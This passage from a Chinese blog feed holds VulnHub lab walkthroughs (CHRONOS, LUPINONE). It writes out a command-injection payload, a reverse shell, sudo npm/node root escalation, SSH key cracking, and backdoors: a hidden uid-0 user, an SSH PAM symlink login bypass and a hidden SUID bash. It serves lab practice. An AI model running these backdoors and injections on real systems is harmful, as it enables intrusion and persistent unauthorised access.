alt></p>\n<p>这是 brainfuck 加密，在线解密 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-247.png\" alt></p>\n<p>得到提示，我们需要进入到 kira 用户里边，再次在目标服务器里边进行搜索，找到一个敏感目录 /opt/L</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-248.png\" width=\"570\" alt=\"Image\">\n<p>在线解密 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-249.png\" alt></p>\n<p>-&gt; 通过 magic 方法可破解得到密码 kiraisevil</p>\n<p><code>su kira</code>  切换到 kira 账户，sudo -l 查看相关权限设置<br>\n发现该账户可以执行所有的 root 命令，直接 sudo su 切换到 root 账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-250.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"创建特权用户维权\"><a class=\"markdownIt-Anchor\" href=\"#创建特权用户维权\">#</a> 创建特权用户维权</h3>\n<p>权限维持参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv\">https://bypass007.github.io/Emergency-Response-Notes/privilege/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个用户名X_T，密码 123456 的普通用户</span></span><br><span class=\"line\">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; 123456` X_T</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个用户名kali，密码kali的root用户</span></span><br><span class=\"line\">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; kali` kali -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">尝试连接</span></span><br><span class=\"line\">ssh X_T@192.168.31.212</span><br><span class=\"line\">su kali</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-251.png\" alt></p>\n<p>-&gt; 每次都可以通过先登陆到 X_T 用户，再通过 su kali 切换到 root 账户</p>\n<h3 id=\"可疑用户排查技巧\"><a class=\"markdownIt-Anchor\" href=\"#可疑用户排查技巧\">#</a> 可疑用户排查技巧</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询特权用户特权用户(uid 为 0 )</span></span><br><span class=\"line\">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询可以远程登录的帐号信息</span></span><br><span class=\"line\">awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">除root帐号外，其他帐号是否存在sudo权限。如没有必要，普通帐号应删除sudo权限</span></span><br><span class=\"line\">more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-252.png\" alt></p>\n<p>-&gt; 靶机攻击结束</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/113%20CHRONOS/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/113%20CHRONOS/",
            "title": "VULNHUB 13 CHRONOS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=\">https://www.vulnhub.com/entry/chronos-1,735/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDExNDQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15801144.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 CHRONOS：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-263.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.238</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.238 -oN /tmp/chronos.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-264.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21, 80, 8080</p>\n<h3 id=\"js-代码美化\"><a class=\"markdownIt-Anchor\" href=\"#js-代码美化\">#</a> js 代码美化</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM4Lw==\">http://192.168.31.238/</span> 收集信息</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-265.png\" alt></p>\n<p>审查源代码，发现一串敏感代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-266.png\" width=\"570\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span> 上进行 js 代码美化</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-267.png\" alt></p>\n<p>复制代码，并且写到 kali 上，开启简易 web，在网站上浏览详细内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-268.png\" width=\"520\" alt=\"Image\">\n<p>看到了一个可疑的 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD00dWdZRHVBa1NjQ0c1Z01jWmpFTjNtQUx5RzFkRDVaWXNpQ2ZXdlEydzlhbllHeUw=\">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span></p>\n<p>-&gt; 可疑密文：4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-269.png\" alt></p>\n<h3 id=\"base58-解密\"><a class=\"markdownIt-Anchor\" href=\"#base58-解密\">#</a> base58 解密</h3>\n<p>修改本地 hosts，访问此网站</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-270.png\" width=\"450\" alt=\"Image\">\n<p>将可疑密文在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span> 上进行解密，发现是 base58 加密<br>\n <code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code> <br>\n 即意味着服务上执行了 date ‘+Today is % A, % B % d, % Y % H:% M:% S.’<br>\n想办法构造 payload 拼接此代码并进行加密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-271.png\" alt></p>\n<p>date ‘+Today is %A, %B %d, %Y %H:%M:%S.’|ls<br>\n 并且在 cyberchef 上进行 base58 加密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-272.png\" width=\"470\" alt=\"Image\">\n<p>得到密文：6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-273.png\" alt></p>\n<p>访问 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD02bzRwVmZOdDV1NjhodktOckF5TnV5cjdhdDI1RGRtMThDRVptOEptWDJHWXlzTWI3V2Rn\">http://chronos.local:8000/date?format=6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg</span></p>\n<p>访问网址后并没有很明显的效果返回，利用 burp 做中间代理，拦截浏览器的数据，查看返回数据包，返回的是权限不足</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-274.png\" alt></p>\n<p>修改 UA 头，将其改为网站 header 指向的 Chronos 重发数据包，返回数据成功</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-275.png\" alt></p>\n<h3 id=\"拼接linux命令反弹\"><a class=\"markdownIt-Anchor\" href=\"#拼接linux命令反弹\">#</a> 拼接 linux 命令反弹</h3>\n<p>在 CyberChef 上获取到反弹 shell 的 base58 加密的字符<br>\n U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PUwNR</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-276.png\" alt></p>\n<p>拼接到 url 地址中，并且监听本地的 4445 端口，等待 shell<br>\n 等同于访问 http://chronos.local:8000/date?format=U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PuwNR<br>\n 并修改 UA 为 Chronos</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-277.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接收到shell之后，使用python3 改为一个标准的终端</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-278.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器的相关信息</span></span><br><span class=\"line\">sudo - l</span><br><span class=\"line\">cat /etc/issue</span><br><span class=\"line\">uname -a</span><br><span class=\"line\">make</span><br><span class=\"line\">ls -Alh `which pkexec`</span><br><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class=\"line\">id</span><br><span class=\"line\">ls /opt &amp;&amp; ls /var &amp;&amp; ls /home</span><br></pre></td></tr></table></figure>\n<p>发现服务器上无权限设置的错误，也不能利用 pkexec<br>\n 进行提权，id 组也没有设置错误，没有 suid 的错误权限可利用文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-279.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"express-fileupload提权\"><a class=\"markdownIt-Anchor\" href=\"#express-fileupload提权\">#</a> express-fileupload 提权</h3>\n<p>继续翻阅文件，查找的一个 chronos-v2 的文件夹，找到 server.js 中有 express-fileupload 的调用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-280.png\" width=\"500\" alt=\"Image\">\n<p>直接用谷歌搜索是否存在此组件的漏洞，果然找到了一个 exp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-281.png\" width=\"560\" alt=\"Image\">\n<p>在 github 上找到了 ejs 利用的代码，复制此 payload</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-282.png\" alt></p>\n<p>将 payload 中的参数进行修改，反弹主机 ip 和端口，以及 ejs 的端口号<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-283.png\" width=\"570\" alt=\"Image\"></p>\n<p>开启简易 web 服务，将此文件下载到目标靶机上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-284.png\" width=\"540\" alt=\"Image\">\n<p>目标靶机通过运行 ejs.py 文件，shell 成功被反弹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用python，<span class=\"built_in\">stty</span>得到一个标准的shell</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-285.png\" alt></p>\n<h3 id=\"sudonpmnode提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonpmnode提权\">#</a> sudo (npm/node) 提权</h3>\n<p>查看相关权限的设置，发现 npm，node 都可以提权<br>\n在 https://gtfobins.github.io/ 上找到提权命令进行提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">npm 提权</span></span><br><span class=\"line\">sudo npm exec /bin/bash</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">node 提权</span></span><br><span class=\"line\">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-286.png\" width=\"580\" alt=\"Image\">\n<p>-&gt; 获取到了 root 权限</p>\n<h3 id=\"ssh-pam-软链接维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-pam-软链接维权\">#</a> SSH PAM 软链接维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 靶机上执行：</span></span></span><br><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查端口号看是否命令是否执行成功：</span></span><br><span class=\"line\">ps aux | grep 12345</span><br><span class=\"line\">netstat -tanlp | grep 12345</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-287.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 攻击机执行：</span></span></span><br><span class=\"line\">ssh root@192.168.31.238 -p 12345</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接着输入任意密码就可以root用户权限登陆了</span></span><br></pre></td></tr></table></figure>\n<p>实际测试中发现，如果 root 用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：<br>\nssh <span class=\"exturl\" data-url=\"bWFpbHRvOmltZXJhQDE5Mi4xNjguMzEuMjM4\">imera@192.168.31.238</span> -p 12345 接着输入任意密码就可以 imera 用户权限登陆了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在ssh的配置文件中开启root登陆，是否可以解决无法用root登陆的问题</span></span><br><span class=\"line\">cat /etc/ssh/sshd_config | grep PermitRootLogin</span><br><span class=\"line\">vim /etc/ssh/sshd_config</span><br><span class=\"line\">service ssh restart</span><br><span class=\"line\">ssh root@192.168.31.238 -p 12345</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-288.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 并不能直接登陆到 root 账户，需要其他的设置进入 root 账户</p>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> SUID 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">制作隐藏的SUID文件</span></span><br><span class=\"line\">cp /bin/bash /var/.hack</span><br><span class=\"line\">chmod 4755 /var/.hack</span><br><span class=\"line\">ls -Alh /var/.hack</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-289.png\" width=\"420\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接靶机并用SUID文件提权至root</span></span><br><span class=\"line\">ssh imera@192.168.31.238 -p 12345</span><br><span class=\"line\">/var/.hack -p &amp; whoami</span><br></pre></td></tr></table></figure>\n<p>-&gt; 维持到了 root，现用 imera 登陆，再用 /var/.hack 提权</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/116%20LUPINONE/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/116%20LUPINONE/",
            "title": "VULNHUB 16 LUPINONE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWx1cGlub25lLDc1MC8=\">https://www.vulnhub.com/entry/empire-lupinone,750/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDAzMTg0L2FydGljbGUvZGV0YWlscy8xMjI3NjY0ODM=\">https://blog.csdn.net/qq_45403184/article/details/122766483</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 LUPINONE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-331.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.236</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.236</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-332.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTM2\">http://192.168.31.136</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-333.png\" width=\"520\" alt=\"Image\">\n<p>是一个没有任何可以点击的单纯的页面，并且审查源代码没有任何提示</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.236 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-334.png\" alt></p>\n<p>扫描到了 robots.txt 这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-335.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 得到一个提示 /～myfiles</p>\n<h3 id=\"wfuzz-模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-模糊测试\">#</a> wfuzz 模糊测试</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可能隐藏的含义是，一个缺少参数的后门文件</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~myfiles/?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure>\n<p>扫描是否存在 http://192.168.31.236/~myfiles/?FUZZ=xx</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-336.png\" alt></p>\n<p>返回结果全是 200 即表示不存在拼接参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可能是一个目录结构，首字符为～的形式</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-</span><br><span class=\"line\">list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<p>扫描是否存在 http://192.168.31.236/～FUZZ</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-337.png\" alt></p>\n<p>返回结果都是 404</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">过滤掉 404 继续扫描</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-</span><br><span class=\"line\">list-2.3-medium.txt | grep -v 404</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-338.png\" alt></p>\n<p>扫到了一个特殊的目录 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQ=\">http://192.168.31.236/~secret</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-339.png\" alt></p>\n<p>-&gt; 提示有一个 ssh 私钥文件隐藏在这个目录下，并且需要 fasttrack 这个字典，有一个用户叫做 icex64</p>\n<h3 id=\"burp-加载字典爆破\"><a class=\"markdownIt-Anchor\" href=\"#burp-加载字典爆破\">#</a> burp 加载字典爆破</h3>\n<p>burp 做代理，拦截浏览器请求，识别是否存在隐藏文件.a.txt 的文件将 a 与 txt 作为变量，进行多次重发数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-340.png\" width=\"480\" alt=\"Image\">\n<p>选择字典，第一个字典我选用的是 kali 中的 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-341.png\" width=\"450\" alt=\"Image\">\n<p>第二个字典是几种比较可能的私钥文件后缀:.txt,.pub,.html,.cer,.pem,.der,.key</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-342.png\" width=\"430\" alt=\"Image\">\n<p>数据装载完毕，开始爆破</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-343.png\" alt></p>\n<p>-&gt; 唯一返回的 200 状态码的是 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==\">http://192.168.31.236/~secret/.mysecret.txt</span></p>\n<h3 id=\"ffuf-模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf-模糊测试\">#</a> ffuf 模糊测试</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者用ffuf的方法进行爆破目录</span></span><br><span class=\"line\">ffuf -u &quot;http://192.168.31.236/~secret/.FUZZ&quot; -w /usr/share/seclists/Discovery/Web-</span><br><span class=\"line\">Content/directory-list-2.3-medium.txt - e .txt,.pub,.html,.cer,.pem,.der,.key</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-344.png\" width=\"600\" alt=\"Image\">\n<p>-&gt; 获得关键网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==\">http://192.168.31.236/~secret/.mysecret.txt</span></p>\n<h3 id=\"cyberchef-解密\"><a class=\"markdownIt-Anchor\" href=\"#cyberchef-解密\">#</a> CyberChef 解密</h3>\n<p>访问该网址，得到了一串密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-345.png\" width=\"600\" alt=\"Image\">\n<p>用 CyberChef 通过 magic 方法在线解密，得到是 base58 解密，复制解密代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-346.png\" alt></p>\n<p>观察得到的密文，发现仍然是加密的！并不是真正的 ssh 私钥！</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-347.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"john-破解私钥\"><a class=\"markdownIt-Anchor\" href=\"#john-破解私钥\">#</a> john 破解私钥</h3>\n<p>采用 ssh2join.py 来破解 ssh 私钥，john 是一个破解系统密码的工具。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">寻找 ssh2join.py 位置</span></span><br><span class=\"line\">使用locate sshjoin.py没有发现ssh2join.py文件</span><br><span class=\"line\">改用find / -name “ssh2john.py”</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用工具 ssh2john 转换为可以识别的信息</span></span><br><span class=\"line\">python /usr/share/john/ssh2john.py ~/Desktop/tool/lupin/vulnhub_lupin &gt; crack.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-348.png\" width=\"600\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">接下来要使用到上文所提示到的fastrack.txt文件</span><br><span class=\"line\">find / -name “fasttrack.txt”</span><br><span class=\"line\">john crack.txt --wordlist=/usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-349.png\" width=\"600\" alt=\"Image\">\n<p>-&gt; 得到私钥文件的密码 P@55w0rd!</p>\n<p>指定私钥文件登陆对方服务器，选择密钥的密码为破解的密码</p>\n<p><code>ssh icex64@192.168.31.236 -i vulnhub_lupin</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-350.png\" width=\"440\" alt=\"Image\">\n<p>成功登陆到了服务器，并且有一个隐私设置问题</p>\n<p>-&gt; 可以无密码调用 arsene 用户去执行这个文件</p>\n<h3 